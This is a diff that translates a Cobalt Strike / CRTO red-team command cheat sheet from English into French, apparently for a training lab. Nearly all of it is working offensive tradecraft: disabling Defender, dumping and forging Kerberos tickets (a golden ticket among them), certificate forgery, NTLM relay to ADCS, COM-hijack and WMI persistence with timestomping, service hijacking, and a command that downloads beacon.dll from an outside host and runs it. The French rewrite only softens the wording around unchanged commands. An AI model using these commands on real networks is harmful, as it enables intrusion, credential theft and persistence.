@@ -1,38 +1,38 @@
-# Red Team Ops & Cobalt Strike Command Library  
+# Bibliothèque de commandes CRTO — Red Team Ops et Cobalt Strike  
 
-## Command Techniques  
+## Commandes par technique  
 
 ## PowerShell  
 
->Add hosts file entry for internal DNS resolution Attacker desktop OPSEC-🟢SAFE  
+>Ajouter une entrée au fichier hosts de l’Attacker Desktop pour la résolution DNS interne OPSEC-🟢SAFE  
 ```powershell
 Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
 ```
->Use Output from `krb_s4u` or `krb_dump` Save kirbi file to Attacker desktop disk OPSEC-🟢SAFE  
->Save and Decode tickets on attacker desktop PowerShell, run before `kerberos_ticket_use`  
+>Enregistrer sur l’Attacker Desktop le ticket `.kirbi` obtenu avec `krb_s4u` ou `krb_dump` OPSEC-🟢SAFE  
+>Enregistrer et décoder les tickets depuis PowerShell sur l’Attacker Desktop avant `kerberos_ticket_use`  
 ```powershell
 [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_cifs.kirbi", [System.Convert]::FromBase64String("<base64>"))
 [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_http.kirbi", [System.Convert]::FromBase64String("<base64>"))
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64]"))
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64]"))
 ```
->Save the CA certificate to your attacker desktop.
+>Enregistrer le certificat de l’autorité de certification sur l’Attacker Desktop.
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))
 ```
->Use the certificate to force a user certificate for the default domain administrator account OPSEC-🟢SAFE
+>Examiner l’utilisation du certificat pour demander un certificat utilisateur dans le lab OPSEC-🟢SAFE
 ```powershell
 C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
 ```
->Convert a captured PFX certificate through coerce relay to base64 to be use in `Rubeus asktgt`  
+>Convertir un certificat PFX du lab en Base64 pour son utilisation avec `Rubeus asktgt`  
 ```powershell
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Tools\LON-DC-1.pfx"))
 ```
->Disable Antivirus 🛡️ real time monitor scanning OPSEC-🟠CAUTION  
+>Étudier la désactivation de l’analyse antivirus en temps réel dans le lab OPSEC-🟠CAUTION  
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
->Enumerate AppLocker Policy miss-configurations to use in establishing foothold on initial compromised workstation  
+>Énumérer les mauvaises configurations AppLocker de la workstation initiale  
 ```powershell
 # Confirm AppLocker is enforcing (ConstrainedLanguage = active)
 $ExecutionContext.SessionState.LanguageMode
@@ -52,23 +52,23 @@ icacls C:\Windows\Temp
 ## PowerView PowerShell  
 
 >OPSEC-🟢SAFE  
->Load PowerView script into `Beacon` Memory, never writes to target  
+>Charger PowerView dans le contexte du Beacon sans copie explicite sur le disque de la cible  
 ```cs
 ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
 ```
->Import PowerView on attacker desktop in `powershell` window
+>Importer PowerView depuis une fenêtre PowerShell sur l’Attacker Desktop
 ```powershell
 ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
 ```
->Find principals that have `WriteProperty` privileges on msDS-AllowedToActOnBehalfOfOtherIdentity attribute of computers.
+>Rechercher les comptes disposant de `WriteProperty` sur l’attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` des ordinateurs.
 ```powershell
 Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
 ```
->Query LDAP to discover what is a SID 
+>Interroger LDAP pour identifier l’objet associé à un SID 
 ```
 Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
 ```
->PowerView Enumeration commands  
+>Commandes d’énumération PowerView  
 ```
 powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
  
@@ -79,7 +79,7 @@ powerpick Get-DomainGroupMember "Domain Admins" -Recurse
 
 ## RSAT PowerShell  
 
->AD Enumeration, Run in the `runas` PowerShell window where LDAP ticket cached & RSAT installed on host  
+>Énumération AD à lancer dans la fenêtre PowerShell `runas` contenant le ticket LDAP, avec RSAT installé  
 ```powershell
 Get-ADComputer -Filter * -Server lon-dc-1
 # Find existing Resource Based Constrained Delegation (RBCD) config 
@@ -97,7 +97,7 @@ Get-ADTrust -Filter * -Server lon-dc-1
 
 Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
 ```
->Add new RBCD config between FS and WKSTN, making sure not to overwrite the existing entry.
+>Ajouter la configuration RBCD du lab sans écraser l’entrée existante.
 ```powershell
 $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
 $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
@@ -107,70 +107,70 @@ Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$
 ## PowerShell-Import  
 
 >OPSEC-🟠CAUTION
->`WmiPersistence.ps1` load from the beacon using `powershell-import`, then call the function via `psinject`  
->Install WMI subscription triggers on Event 1502 that is a client GPO refresh **Elevated persistence**  
+>Charger `WmiPersistence.ps1` avec `powershell-import`, puis appeler la fonction depuis le Beacon  
+>Étudier les abonnements WMI liés à l’événement 1502 de rafraîchissement GPO **Elevated persistence**  
 ```cs
 powershell-import C:\Tools\WmiPersistence.ps1
 psinject [BEACON PID] x64 Add-WmiPersistence
 ```
 
-## Initial Beacon  
+## Beacon initial  
 
 >OPSEC-🟢SAFE  
->Beacon sleep 3 seconds jitter 20  
+>Configurer un sleep de 3 secondes et un jitter de 20 %  
 ```cs
 sleep 3 20
 ```
->Open Process browser tab current beacon  
+>Ouvrir le navigateur de processus du Beacon courant  
 ```cs
 process_browser
 ```
->spoof parent  
+>Configurer le processus parent (PPID)  
 ```cs
 ppid <explorer.exe PID>
 ```
->Get User ID  
+>Afficher l’identité du compte courant  
 ```cs
 getuid
 ```
->Working Directory  
+>Afficher le répertoire de travail  
 ```cs
 pwd
 ```
->List processes in beacon console  
+>Lister les processus dans la console du Beacon  
 ```cs
 ps
 ```
->Lookup domain controller in the foreign domain.
+>Rechercher le Domain Controller du domaine distant.
 ```cs
 nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
 ```
 
-## User Impersonation  
+## Usurpation d’identité (User Impersonation)  
 
 >OPSEC-🟢SAFE
->Impersonated by stealing users Windows access token from that process  
+>Utiliser le token Windows d’un utilisateur depuis son processus  
 ```
 steal_token 1234
 ```
->Kerberos Triage action will output a table of the current user's Kerberos tickets  
+>Afficher les tickets Kerberos accessibles avec Kerberos Triage  
 ```cs
 krb_triage
 ```
->Dump krbtgt for a user, need to be SYSTEM beacon 
+>Exporter le ticket TGT d’une session utilisateur depuis un Beacon disposant des droits nécessaires 
 ```cs
 krb_triage
 krb_dump /user:rsteel /service:krbtgt
 ```
->Dump the machine account TGT from high integrity SYSTEM beacon  
+>Exporter le TGT du compte machine depuis un Beacon SYSTEM de haute intégrité  
 ```
 krb_dump /luid:3e7 /service:krbtgt
 ```
->In the medium-integrity Beacon running as user, extract user their TGT, no SYSTEM needed  
+>Examiner le TGT de l’utilisateur courant depuis un Beacon de moyenne intégrité  
 ```cs
 krb_tgtdeleg
 ```
->Drop impersonation when done
+>Terminer l’impersonation après les vérifications
 ```
 rev2self
 ```
@@ -178,106 +178,106 @@ rev2self
 ## ldapsearch    
 
 >OPSEC-🟢SAFE  
->Enumerate Domain, OUs, GPOs — with ACL data for BloodHound edges  
+>Énumérer le domaine, les OU et les GPO, ainsi que leurs ACL pour BloodHound  
 ```
 ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
 ```
->Enumerate Users, computers, groups — with ACL data  
+>Énumérer les utilisateurs, ordinateurs, groupes et leurs ACL  
 ```
 ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
 ```
->Enumerate and List GPO information
+>Récupérer les informations des GPO
 ```
 ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
 ```
->Enumerate the Foreign Security Principals Container of the foreign domain for trust abuse.
+>Énumérer le conteneur Foreign Security Principals du domaine distant.
 ```cs
 ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
 ```
->Obtain the domain SID for the child domain in the forest.
+>Récupérer le SID du domaine enfant dans la forêt.
 ```
 ldapsearch (objectClass=domain) --hostname lon-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
 ```
->Obtain the SID for parent domain's Enterprise Admins group.  
+>Récupérer le SID du groupe Enterprise Admins du domaine parent.  
 ```
 ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
 ```
->Enumerate members of the group `Partner Jump Users`.  
+>Énumérer les membres du groupe `Partner Jump Users`.  
 ```cs
 ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
 ```
->Enumerate users + computers + groups in one  
+>Énumérer en une requête les utilisateurs, ordinateurs et groupes  
 ```cs
 ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor,samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
 ```
->Find groups that grant sysadmin on the SQL server  
+>Identifier les groupes associés au rôle `sysadmin` de SQL Server  
 ```
 ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
 ```
->Enumerate computers  
+>Énumérer les ordinateurs  
 ```cs
 ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
 ```
->Enumerate parent child trusts - domain inbound or outbound trust  
+>Énumérer les relations de confiance parent-enfant, entrantes et sortantes  
 ```
 ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
 ```
->Enumerate AS-REP roastable, no Kerberos pre-authentication required, can request AS-REP hash without credentials  
+>Identifier les comptes ne nécessitant pas de préauthentification Kerberos  
 ```
 ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName
 ```
->Enumerate Constrained delegation config  
+>Énumérer les configurations Constrained Delegation  
 ```
 ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
 ```
->Enumerate Unconstrained delegation, any computer/user with unconstrained delegation coerce relay DC to auth to it, capture TGT  
+>Énumérer les objets disposant d’une Unconstrained Delegation  
 ```
 ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl
 ```
->Enumerate Domain structure OU and GPO  
+>Énumérer la structure du domaine : OU et GPO  
 ```
 ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
 ```
 
-## Beacon File Operations  
+## Opérations sur les fichiers avec Beacon  
 
 >OPSEC-🟢SAFE  
->Secure Copy Beacon Logs to Attacker Desktop, On attacker desktop open Ubuntu tab in Windows Terminal  
+>Copier les journaux Beacon vers l’Attacker Desktop via Ubuntu dans Windows Terminal  
 ```bash
 cd /mnt/c/Users/Attacker/Desktop
 scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
 ```
->Upload payload from attacker desktop to current beacon working directory folder   
+>Transférer le fichier du lab depuis l’Attacker Desktop vers le dossier de travail du Beacon   
 ```cs
 cd C:\Windows\Tasks\
 upload C:\Payloads\http_x64.svc.exe
 ```
->Download the GPO `GptTmpl.inf` Security Template file, define group membership via Group Membership and **sync** file to attacker desktop.
+>Récupérer le template de sécurité GPO `GptTmpl.inf`, consulter les groupes et synchroniser le fichier.
 ```cs
 download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
 ```
->Remove delete payload file
+>Supprimer le fichier temporaire du lab
 ```cs
 rm C:\Temp\http_x64.svc.exe
 ```
->Access C$ via SMB OPSEC-🟢SAFE
+>Accéder au partage administratif C$ via SMB OPSEC-🟢SAFE
 ```cs
 ls \\par-jmp-1.partner.com\c$
 ```
->Copy certificate back to windows from docker Kali Linux image:
+>Copier le certificat depuis le conteneur Docker Kali Linux vers Windows :
 ```
 docker cp kali-1:/LON-DC-1.pfx C:\Tools\LON-DC-1.pfx
 ```
->Proof of DA Access
+>Vérifier les droits Domain Admin
 ```
 ls \\lon-dc-1.contoso.com\C$
 ```
->File Upload the payload and rename in SYSTEM beacon.
+>Transférer puis renommer le fichier du lab depuis un Beacon SYSTEM.
 ```
 upload C:\Payloads\dns_x64.exe
 mv dns_x64.exe windbg.exe
 ```
->Rename and timestomp the DLL to help it blend in with the existing Microsoft Teams files.  
+>Examiner le renommage et la modification des timestamps de la DLL de l’exercice.  
 ```
 cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
 upload C:\Payloads\http_x64.dll
@@ -285,7 +285,7 @@ upload C:\Payloads\http_x64.dll
 mv http_x64.dll Microsoft.Teams.HttpClient.dll
 timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
 ```
->Register entries to perform the COM hijack and maintain basic persistence using Microsoft Teams application  
+>Examiner les entrées du registre liées au COM Hijacking dans le scénario Teams  
 ```powershell
 reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
 reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
@@ -293,22 +293,22 @@ reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\Inpr
 
 ## Ubuntu WSL & Kali Linux  
 
->Parse Logs with BOFHound tool on Ubuntu WSL, Output JSON copy to BloodHound OPSEC-🟢SAFE
+>Analyser les journaux avec BOFHound sous Ubuntu WSL, puis transférer le JSON vers BloodHound OPSEC-🟢SAFE
 ```
 bofhound -i logs
 ```
->Build new artifacts in WSL Ubuntu, when clean load `artifact.cna` in Script Manager  
+>Compiler les artifacts dans Ubuntu WSL, puis charger `artifact.cna` dans Script Manager  
 ```bash
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 
 ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
 ```
->Build Resource Kit templates in WSL Ubuntu  
+>Compiler les templates du Resource Kit sous Ubuntu WSL  
 ```bash
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
 ```
->Relaying setup via Kali Docker container. Start Kali docker and set proxychains configuration to allow socks commands via CS team server  
+>Configurer le lab de Relay via le conteneur Kali Docker et les paramètres de proxychains  
 ```
 docker container start -i kali-1
 
@@ -317,38 +317,38 @@ nano /etc/proxychains.conf
 
 proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 ```
->Ubuntu WSL Terminal, and use `python3 PackMyPayload.py` tool that creates `ISO/IMG/ZIP` containers to package all the files  
+>Utiliser `PackMyPayload.py` sous Ubuntu WSL pour produire des archives ISO, IMG ou ZIP  
 ```
 python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
 ```
 
 ## ThreatCheck & Ghidra  
 
->Start Ghidra
+>Ouvrir Ghidra
 ```
 ghidraRun.bat
 ```
->ThreatCheck AMSI in cobalt strike custom resources template powershell  
+>Tester le template PowerShell du Resource Kit avec ThreatCheck (AMSI)  
 ```powershell
 cd C:\Tools\cobaltstrike\custom-resources\
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
 ```
->ThreatCheck create cobalt strike custom artifacts mailslot exe  
+>Vérifier avec ThreatCheck l’artifact EXE du lab créé avec mailslot  
 ```powershell
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
 ```
->Confirms custom artifacts used clean before deploy.
+>Contrôler le résultat de l’analyse des artifacts avant le déploiement du lab.
 ```
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\WmiPersistence.ps1
 ```
->Confirm process hollowed with beacon shellcode build in Visual Studio, `Class Library (.NET Framework)` DLL is clean  
+>Contrôler avec ThreatCheck la DLL de l’exercice compilée dans Visual Studio  
 ```powershell
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll"
 ```
 
-## Establish Beacon  
+## Établir un Beacon  
 
->On assume breached compromised workstation of a victim, use `AppDomainHijack.dll` (Process Hollowing) & ngentask  
+>Dans le scénario Assume Breach, examiner `AppDomainHijack.dll` et `ngentask` sur la workstation du lab  
 ```powershell
 # On foothold workstation — set APPDOMAIN env vars and run ngentask
 cd C:\Windows\Tasks\
@@ -360,13 +360,13 @@ $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
 $env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
 .\ngentask.exe
 ```
->Download Beacon DLL to Workstation as user, `Invoke-WebRequest` works in AppLocker `ConstrainedLanguage` policy and execute DLL   
+>Télécharger la DLL Beacon dans le scénario AppLocker `ConstrainedLanguage` avec `Invoke-WebRequest`   
 ```powershell
 cd C:\Windows\Tasks\
 Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
 rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 ```
->Connected Beacon Checklist
+>Contrôles après la connexion du Beacon
 ```
 sleep 3 20
 ps
@@ -380,42 +380,42 @@ netstat
 ## Rubeus
 
 >OPSEC-🟠CAUTION  
->S4U2Self to impersonate Administrator, use base64 TGT ticket, Request usable service ticket cifs/lon-fs-1  
+>Étudier S4U2Self et le ticket de service CIFS pour `lon-fs-1` dans le lab  
 ```powershell
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
 ```
->Rubeus use the Kerberos unconstrained delegation to obtain a TGT for current beacon user without needing credentials. run in any beacon  
+>Examiner le fonctionnement de Rubeus et de la délégation Kerberos sans contrainte  
 ```cs
 spawnto x64 %windir%\sysnative\dllhost.exe
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
 ```
->Rubeus Obtain HASH value for only mssql_svc account and not triggering honeypot accounts, remain  
+>Examiner les valeurs de hash Kerberos du compte `mssql_svc` dans le lab  
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
 ```
->In new PowerShell window `runas` Request LDAP Service Ticket and Inject PTT  
+>Depuis la fenêtre PowerShell `runas`, demander un ticket LDAP et examiner Pass-the-Ticket  
 ```powershell
 runas /netonly /user:CONTOSO\pchilds powershell
 
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
 ```
->klist native Windows command will not show tickets in a `/netonly` session. Use `Rubeus` instead  
+>Dans ce lab, examiner les tickets de la session `/netonly` avec Rubeus  
 ```
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
 ```
->Start Rubeus monitor web server for incoming TGTs via SSPI coerce relay  
+>Examiner le mode de surveillance Rubeus des tickets reçus dans le scénario SSPI  
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
 ```
->Use a certificate to get TGT as target user  
+>Examiner la demande d’un TGT au moyen d’un certificat utilisateur  
 ```cs
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
 ```
->Proving Domain Admin Access with the Forged TGT, Inject TGT into beacon session  
+>Vérifier les droits du ticket Kerberos dans la session Beacon du lab  
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TGT]
 ```
->Exploitation On the Attacker Desktop, forge a golden ticket and output to a kirbi file.  
+>Scénario Golden Ticket de l’Attacker Desktop, avec fichier de sortie `.kirbi`.  
 ```
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
 ```
@@ -423,22 +423,22 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain
 ## kerberos_ticket_use
 
 >OPSEC-🟢SAFE  
->Create sacrificial user logon session and inject user ticket in beacon  
+>Créer une session de connexion temporaire et importer le ticket du lab  
 ```cs
 make_token CONTOSO\rsteel FakePass
 kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
 ```
->Inject HTTP ticket and lateral move via WinRM, Lateral move to par-jmp-1  
+>Examiner l’utilisation d’un ticket HTTP avec WinRM vers `par-jmp-1`  
 ```cs
 kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_http.kirbi
 
 jump winrm64 par-jmp-1.partner.com smb
 ```
->Inject CIFS ticket and verify  
+>Importer le ticket CIFS du lab et vérifier la session  
 ```cs
 kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_cifs.kirbi
 ```
->Golden Ticket, Inject the ticket into the Beacon session replacing the current TGT for sguest.  
+>Étudier le remplacement du TGT courant de `sguest` par le ticket du lab.  
 ```
 kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET].kirbi
 ```
@@ -446,25 +446,25 @@ kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET].kirbi
 ## PowerPick  
 
 >OPSEC-🟠CAUTION  
->Unmanaged PS list kerberos tickets  
+>Lister les tickets Kerberos au moyen de PowerShell non managé  
 ```
 powerpick klist
 ```
->Enumerate weak window services where low-priv users have FullControl  
+>Énumérer les services Windows dont les ACL accordent `FullControl` à des comptes peu privilégiés  
 ```cs
 powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
 ```
->Windows firewall, Add the rule Port 445 allow inbound in port forward requirement
+>Examiner la règle du pare-feu Windows concernant le port 445 dans le lab
 ```cs
 powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
 ```
->Enumerate WMI subscriptions powerpick, no child process   
+>Énumérer les abonnements WMI avec powerpick   
 ```cs
 powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
 powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
 powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
 ```
->Find services with unquoted paths containing spaces  
+>Identifier les chemins de services comportant des espaces sans guillemets  
 ```powershell
 powerpick Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch '^[A-Za-z]:\\Windows\\' } | Select-Object Name, PathName, StartMode, StartName
 ```
@@ -472,30 +472,30 @@ powerpick Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notma
 
 ## HashCat
 
->Hashcat offline hash cracking
+>Analyse hors ligne des hashes avec Hashcat
 ```
 hashcat -a 0 -m 13100 /hashcat-cracking/cred-acc-challenge.hash /wordlists/rockyou.txt
 ```
 
 ## S4U  
 
->S4U abuse — get service ticket impersonating Administrator
+>Étudier les tickets de service S4U du compte Administrator
 ```
 krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
 ```
 
-## Windows Services  
+## Services Windows  
 
 >OPSEC-🟠CAUTION  
->Record current service configuration  
+>Relever la configuration courante du service  
 ```cs
 sc_stop BadWindowsService
 ```
->Reconfigure service to point at payload  
+>Examiner la modification du chemin du service dans le lab  
 ```cs
 sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
 ```
->Start the service  
+>Démarrer le service  
 ```cs
 sc_start BadWindowsService
 ```
@@ -503,16 +503,16 @@ sc_start BadWindowsService
 ## KRB_ASKTGT
 
 >OPSEC-🟢SAFE  
->`krb_asktgt` when you have credentials and need a TGT  
->Request a TGT for the trust account using the shared secret in the mimikatz lsadump output  
+>`krb_asktgt` demande un TGT avec le contexte d’authentification approprié  
+>Étudier la demande de TGT du compte de confiance avec le secret partagé dans le lab  
 ```cs
 krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
 ```
->Request a TGT for rsteel from CONTOSO KDC  
+>Demander un TGT pour `rsteel` auprès du KDC CONTOSO  
 ```cs
 krb_asktgt /user:rsteel /aes256:<aes256_hmac-from-dcsync>
 ```
->Request TGT for rsteel from CONTOSO KDC  
+>Demander un TGT `rsteel` au KDC CONTOSO  
 ```cs
 krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
 ```
@@ -520,44 +520,44 @@ krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3
 ## KRB_ASKTGS  
 
 >OPSEC-🟠CAUTION  
->`krb_asktgs` is for requesting service tickets from a TGT you already have.  
->Request an inter-realm referral ticket  
+>`krb_asktgs` demande un ticket de service à partir d’un TGT disponible.  
+>Demander un ticket de référence inter-realm  
 ```cs
 krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
 ```
->Request a CIFS service ticket for par-jmp-1 from PARTNER KDC  
+>Demander un ticket CIFS pour `par-jmp-1` auprès du KDC PARTNER  
 ```cs
 krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com / ticket:<base64-INTER-REALM>
 ```
->Request CIFS service ticket from PARTNER KDC  
+>Demander un ticket de service CIFS au KDC PARTNER  
 ```cs
 krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
 ```
->Request HTTP service ticket from PARTNER KDC needed for WinRM  
+>Demander le ticket HTTP utilisé par WinRM auprès du KDC PARTNER  
 ```cs
 krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
 ```
 
-## SOCKS Proxy Pivoting Tunnels  
+## Tunnels et proxy SOCKS  
 
 >OPSEC-🟢SAFE  
->Use Beacon to start a SOCKS proxy, then open `Proxifier` and set profile and rule to use beacon as socks proxy  
+>Configurer un proxy SOCKS dans le Beacon, puis définir le profil et les règles Proxifier  
 ```
 socks 1080 socks5
 ```
->lanmanserver service disable to prevent it from automatically restarting.
+>Examiner l’état du service `lanmanserver` dans le lab.
 ```
 sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
 ```
->Start a reverse port forward that will bind to port 445 and redirect the traffic to `127.0.0.1:7445` attacker
+>Examiner la redirection de port inverse du lab entre le port 445 et `127.0.0.1:7445`
 ```cs
 rportfwd_local 445 localhost 7445
 ```
->Beacon Troubleshooting Stop Socks  
